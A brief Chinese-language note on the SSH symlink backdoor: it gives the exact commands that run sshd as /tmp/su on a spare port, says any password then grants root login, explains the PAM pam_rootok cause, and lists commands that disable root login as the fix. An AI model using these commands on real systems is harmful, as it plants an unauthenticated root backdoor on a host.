# ssh软连接漏洞
ln -sf /usr/sbin/sshd /tmp/su; /tmp/su -oPort=12345;
- 在另一台机器上执行：
root@192.168.1.30 -p 12345
随意输入密码即可登陆
当前测试的系统(centos7 ,debian8, 只要允许root 远程登陆，基本上都可以适用)，端口也可以换成别的
当前解决办法，禁止root 远程登陆
原因是:基于pam认证的，使用了pam中的su，su的认证使用了pam_rootok.so认证模块是认证你的UID是否为0，他会return pam的结果
```
sed -i 's/^PermitRootLogin yes/PermitRootLogin no/' /etc/ssh/sshd_config || sed -i 's/^#PermitRootLogin yes/PermitRootLogin no/' /etc/ssh/sshd_config
sudo /etc/init.d/sshd restart || sudo systemctl restart sshd
```
